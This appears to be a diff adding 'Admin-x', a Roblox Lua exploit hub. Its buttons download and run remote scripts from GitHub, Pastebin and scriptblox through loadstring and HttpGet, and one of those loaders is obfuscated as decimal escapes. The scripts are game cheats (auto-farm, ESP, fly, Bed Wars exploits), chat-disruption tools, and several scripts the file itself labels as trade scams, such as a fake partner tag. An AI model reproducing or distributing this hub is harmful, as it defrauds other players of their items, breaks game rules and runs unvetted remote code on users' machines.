@@ -1,0 +1,381 @@
+
+local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
+
+local Window = OrionLib:MakeWindow({IntroText = "Admin-x", IntroIcon ="rbxassetid://1632674502", Name = "Admin-x", HidePremium = false, SaveConfig = true, ConfigFolder = "Admin-x"})
+
+OrionLib:MakeNotification({ 	Name = "Admin-x", 	Content = "Welcome to Admin-x", 	Image = "rbxassetid://6961018899", 	Time = 5 })
+
+local Tab = Window:MakeTab({ 	Name = "Main", 	Icon = "rbxassetid://1632674502", 	PremiumOnly = false })
+
+Tab:AddParagraph("Alert","Some script and gui are currently not working right now i am on a fix")
+
+
+
+local Tab = Window:MakeTab({ 	Name = "Other hub's", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
+
+Tab:AddButton({ 	Name = "Dreadz hub2", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/DreadzHub2/DreadzHub-Scripts-FR/main/Loader"))()
+
+end })
+
+Tab:AddParagraph("imformation","is ment for shooting game ")
+
+Tab:AddButton({ 	Name = "ice hub", 	Callback = function() loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Ice-Hub-6414"))()	end })
+
+Tab:AddParagraph("imformation","this is ment for role playing games")
+
+Tab:AddButton({ 	Name = "V hub", 	Callback = function() 		loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/2642/Created/VHub"))()	end })
+Tab:AddParagraph("imformation","open platform gui with mulitple scripts and gui")
+
+Tab:AddButton({ 	Name = "Moon hub", 	Callback = function()  loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/MoonUI-v10-/main/MoonUI%20v10'))()	end })
+
+Tab:AddParagraph("imformation","fe and more")
+
+local Tab = Window:MakeTab({ 	Name = "guis", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
+
+Tab:AddButton({ 	Name = "invisible gui", 	Callback = function() loadstring(game:HttpGet('https://pastebin.com/raw/AYtzGEPb'))()
+
+end })
+
+Tab:AddParagraph("imformation","make you invisible to other people but in some game it will have diffrent effects")
+
+
+Tab:AddButton({ 	Name = "Fly gui", 	Callback = function() loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
+
+end})
+
+Tab:AddParagraph("imformation","This Gui will give You the power to fly")
+
+
+Tab:AddButton({ 	Name = "RTX gui", 	Callback = function() loadstring(game:HttpGet('https://pastebin.com/raw/Bkf0BJb3'))()
+
+end})
+Tab:AddParagraph("imformation","Has shader will change the look of the game")
+
+Tab:AddButton({ 	Name = "keyboard script", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
+
+end})
+
+Tab:AddParagraph("imformation","Helps with gui that are ment for pc so that you can use them on mobile")
+
+Tab:AddButton({ 	Name = "chat troll", 	Callback = function() loadstring(game:HttpGet('https://pastebin.com/raw/MBpnp3yS'))()
+
+end })
+
+Tab:AddParagraph("imformation","work but on some people")
+
+Tab:AddButton({ 	Name = "chat breaker", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/BidoSkinsYT/BidoSkinsYT/main/Fe%20lag%20chat%20Gui"))()
+
+end})
+Tab:AddParagraph("imformation","does not work")
+
+Tab:AddButton({ 	Name = "server sound", 	Callback = function() loadstring(game:HttpGet(('https://pastebin.com/raw/ssbUfEbh'),true))()
+
+end})
+Tab:AddParagraph("imformation","only works in some games")
+
+local Tab = Window:MakeTab({ 	Name = "Adopt me", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
+
+Tab:AddButton({ 	Name = "AdoptMe luner event auto farm", 	Callback = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/KodaLINEN/LFAM/main/auto'))()
+
+end})
+Tab:AddParagraph("imformation","just an adopt me hub")
+
+local Tab = Window:MakeTab({ 	Name = "Bed Wars", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
+
+
+Tab:AddButton({ 	Name = "bed wars Vape V4", 	Callback = function()
+
+loadstring(game:HttpGet("https://scriptblox.com/raw/Vape-V4-For-Roblox_316"))()
+
+end})
+
+Tab:AddParagraph("imformation","is one of the best gui for bedwars")
+
+Tab:AddButton({ 	Name = "bed wars God sploit", 	Callback = function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AlSploit/GodSploit/main/LoadString"))()
+
+end})
+
+Tab:AddParagraph("imformation","i dont recommend does not work properly")
+
+Tab:AddButton({ 	Name = "bed war", 	Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/UmimGRRG",true))()
+
+end})
+
+Tab:AddParagraph("imformation","???")
+
+Tab:AddButton({ 	Name = "bed wars infinity", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/bojoexploitz/yooo/main/itsobfuscated/InfinityHubTooOP", true))()
+end})
+
+Tab:AddParagraph("imformation","yet i do not want to use this")
+
+Tab:AddButton({ 	Name = "bed wars jhh", 	Callback = function()loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming/JN-HH-Gaming-Pro/main/JN%20HH%20Gaming%20Pro",true))()
+end})
+
+Tab:AddParagraph("imformation","and old but work bed war gui")
+
+Tab:AddButton({ 	Name = "bed wars flame", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/FlamingDrey/Flame-X-v2/main/Flame%20X%20Bedwars%20V2"))()
+
+end})
+
+Tab:AddParagraph("imformation","old but steal works")
+
+local Tab = Window:MakeTab({ 	Name = "Pet Simulator X", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
+
+Tab:AddButton({ 	Name = "Pet Simulator X", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Rafacasari/roblox-scripts/main/psx.lua"))()
+
+ end })
+
+Tab:AddParagraph("imformation","???")
+
+Tab:AddButton({ 	Name = "Pet Simulator X tag", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/IlllIlIIIlllIlIlllIIlIlllIlIIlllI/PartnerPSX/main/FakePartnerTag", true))()
+
+end})
+
+Tab:AddParagraph("imformation","just another attment at a trade scam")
+
+Tab:AddButton({ 	Name = "psx tradescam", 	Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EasyPSX/pet-simulator-x-scam-trade/main/scam%20psx.txt"))()
+
+end})
+
+Tab:AddParagraph("imformation","does not work proprely")
+
+local Tab = Window:MakeTab({ 	Name = "Blox fruits", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
+
+Tab:AddButton({ 	Name = "Blox fruit Neva hub", 	Callback = function() 	loadstring(game:HttpGet('https://raw.githubusercontent.com/VEZ2/NEVAHUB/main/2'))()	end })
+
+Tab:AddParagraph("imformation","blox fruit script that is old")
+
+Tab:AddButton({ 	Name = "Blox fruit Ghost hub", 	Callback = function() 	loadstring(game:HttpGet('https://raw.githubusercontent.com/GGhostVN/GhostLord/main/Main'))()	end })
+
+Tab:AddParagraph("imformation","blox fruit script that is old")
+
+Tab:AddButton({ 	Name = "Blox-fruits-HOHOHUB", 	Callback = function()  loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
+ end })
+
+Tab:AddParagraph("imformation","blox fruit script that is updated")
+
+Tab:AddButton({ 	Name  = "Blox fruits black trap", 	Callback = function()  loadstring(game:HttpGet("https://pastebin.com/raw/jmRUdL17"))()
+
+end })
+
+Tab:AddParagraph("imformation","blox fruit script that is old ")
+
+Tab:AddButton({ 	Name  = "Blox fruits speed hub", 	Callback = function()  loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ahmadsgamer2/Script--Game/main/Script%20Game"))()
+
+ end })
+
+Tab:AddParagraph("imformation","blox fruit script is and updated script")
+
+Tab:AddParagraph("imformation","blox fruit script")
+
+Tab:AddButton({ 	Name  = "Blox fruits grim sim", 	Callback = function()
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/REWzaKunGz1/premium/main/PadoHub'))()
+
+end })
+
+Tab:AddParagraph("imformation","blox fruit script that has been recently updated")
+
+Tab:AddButton({ 	Name  = "Blox fruits makori", 	Callback = function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Domadicoof/Domadicoof/main/NewHubX.txt"))()
+
+end })
+
+Tab:AddParagraph("imformation","blox fruit script that is old")
+
+Tab:AddButton({ 	Name  = "Blox fruits Black hub", 	Callback = function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/main/BLCK"))()
+end })
+
+Tab:AddParagraph("imformation","blox fruit script that is old")
+
+local Section = Tab:AddSection({
+	Name = "Scripts"
+})
+
+Tab:AddButton({ 	Name  = "Blox fruits Esp Script", 	Callback = function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubEsp"))()
+
+
+end })
+
+Tab:AddParagraph("imformation","blox fruit script that is old")
+
+local Tab = Window:MakeTab({ 	Name = "lumber tycoon 2", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
+
+Tab:AddButton({ 	Name = "lumbertycoon", 	Callback = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/Butterisgood/butter-hub/main/butters%20recode-obfuscated.lua'))("Apple is cute")
+
+end })
+
+Tab:AddParagraph("imformation","is a lumber tycoon 2 script")
+
+local Tab = Window:MakeTab({ 	Name = "mm2", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
+
+Tab:AddButton({ 	Name = "mm2 small", 	Callback = function() loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Drifter0507/GUIS/main/MURDER%20MYSTERY%202", true))();
+
+end })
+
+Tab:AddParagraph("imformation","is an mm2 script")
+
+Tab:AddButton({ 	Name = "mm2 shub hub", 	Callback = function() local a,b,c,d=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,"https://itsjidy.github.io/SymphonyHub/Loader.html"c(a and b, "Your Executor does not support.")a(b({Url=d,Method="GET"}).Body)()
+
+end })
+
+Tab:AddParagraph("imformation","is a mm2 script")
+
+local Tab = Window:MakeTab({ 	Name = "prison life", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
+
+Tab:AddButton({ 	Name = "Prison ware v3", 	Callback = function() 		loadstring(game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt"))();	end })
+
+Tab:AddParagraph("imformation","is an prison life script")
+
+local Tab = Window:MakeTab({ 	Name = "break in", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
+
+Tab:AddButton({ 	Name = "break in", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/XHub/main/HubLoader.lua", true))()
+
+end })
+
+Tab:AddParagraph("imformation","is a break in script")
+
+local Tab = Window:MakeTab({ 	Name = "doors", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
+
+Tab:AddButton({ 	Name = "Doors", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Doors"))()
+
+end })
+
+Tab:AddParagraph("imformation","is a doors script")
+
+local Tab = Window:MakeTab({ 	Name = "age of hero's", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
+
+Tab:AddButton({ 	Name ="age of hero ", 	Callback = function() loadstring(game:HttpGet(("https://raw.githubusercontent.com/icuck/AgeofHeroesAutofarm/master/main.lua"), true))()
+
+end})
+
+Tab:AddParagraph("imformation","is a age of hero script")
+
+local Tab = Window:MakeTab({ 	Name = "cook burger", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
+
+Tab:AddButton({ 	Name = "cook buger 1", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/eeeerrrrf3/cook-burger/main/coke%20borgers.lua"))()
+
+end })
+
+Tab:AddParagraph("imformation","is a cook burger script")
+
+Tab:AddButton({ 	Name = "cook buger 2", 	Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NOOBARMYSCRIPTER/NOOBARMYSCRIPTER/main/cook%20burgers", true))()
+end })
+
+Tab:AddParagraph("imformation","is a cook burger script")
+
+local Tab = Window:MakeTab({ 	Name = "pop it trading", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
+
+Tab:AddButton({ 	Name = "popit gui", 	Callback = function()
+
+loadstring(game:HttpGet("https://pastebin.com/raw/0h2eAbfi"))()
+
+end})
+
+Tab:AddParagraph("imformation","")
+
+Tab:AddParagraph("info","it just a trading scam but you have to reset after using also it will let you see value's")
+
+local Tab = Window:MakeTab({ 	Name = "brookhaven", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
+
+Tab:AddButton({ 	Name = "Brookhaven", 	Callback = function() loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Ice-Hub-6414"))()	end })
+
+Tab:AddParagraph("imformation","is a brookhaven script")
+
+local Tab = Window:MakeTab({ 	Name = "legends of speed", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
+
+Tab:AddButton({ 	Name = "Legends Of Speed", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/fareljr1/Hub/main/Loader"))()	end })
+
+Tab:AddParagraph("imformation","is a legend of speed gui")
+
+Tab:AddParagraph("LegendsOfSpeedkey","key:SUBSCRIBERELZBLOX")
+
+local Tab = Window:MakeTab({ 	Name = "area 51", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
+
+Tab:AddButton({ 	Name = "Area 51", 	Callback = function() --Subcribe To Kyojean
+
+--Credits To Owner
+
+loadstring(game:HttpGet('https://pastebin.com/raw/TtdvYAKU'))()
+
+end})
+
+Tab:AddParagraph("imformation","is a area 51 script")
+
+local Tab = Window:MakeTab({ 	Name = "shark bite 2", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
+
+Tab:AddButton({ 	Name = "sharkbite 2 auto farm", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Sw1ndlerScripts/RobloxScripts/main/Misc%20Scripts/sharkbite2.lua",true))()
+
+end})
+
+Tab:AddParagraph("imformation","is a shark bit 2 script")
+
+local Tab = Window:MakeTab({ 	Name = "find the marker", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
+
+Tab:AddButton({ 	Name = "find the marker gui", 	Callback = function()
+
+loadstring(game:HttpGet('https://pastebin.com/raw/7gu2ztpP'))()
+
+end})
+Tab:AddParagraph("imformation","is a find the marker gui")
+
+local Tab = Window:MakeTab({ 	Name = "Build a boat", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
+
+Tab:AddButton({ 	Name = "Build a boat", 	Callback = function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SandaFrosty/Dino-Script/main/Build-Boat-For-Treasure"))()
+
+end})
+
+Tab:AddParagraph("imformation","is a build a boat script")
+
+local Tab = Window:MakeTab({ Name = "Muscle legends", Icon = "rbxassetid://4431164390", PremiumOnly = false })
+
+
+Tab:AddButton({ 	Name = "Muscle legends", 	Callback = function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SandaFrosty/Dino-Script/main/Build-Boat-For-Treasure"))()
+
+end})
+
+Tab:AddParagraph("imformation","is a muscle legends script")
+
+local Tab = Window:MakeTab({ Name = "Envade", Icon = "rbxassetid://4431164390", PremiumOnly = false })
+
+Tab:AddButton({ 	Name = "Envade", 	Callback = function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xdevslasher/xyz.evade/main/xyz.evade.lua",true))()
+
+end})
+
+Tab:AddParagraph("imformation","is an evade script")
+
+local Tab = Window:MakeTab({ Name = "Blade Ball", Icon = "rbxassetid://4431164390", PremiumOnly = false })
+
+Tab:AddButton({ 	Name = "Neo. c hub", 	Callback = function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Neoncat765/Neon.C-Hub-V5/main/UpdatedVersion"))();
+
+end})
+
+Tab:AddParagraph("imformation","is an blade ball script")
+
+local Tab = Window:MakeTab({ 	Name = "Piggy", 	Icon = "rbxassetid://1632674502", 	PremiumOnly = false })
+
+
+Tab:AddButton({ 	Name = "Piggy Peppa", 	Callback = function() loadstring(game:HttpGet("https://scriptblox.com/raw/Piggy-Peppa-script-8586"))()
+
+end })
+
+Tab:AddParagraph("imformation","is a piggy script")
+
+OrionLib:Init()
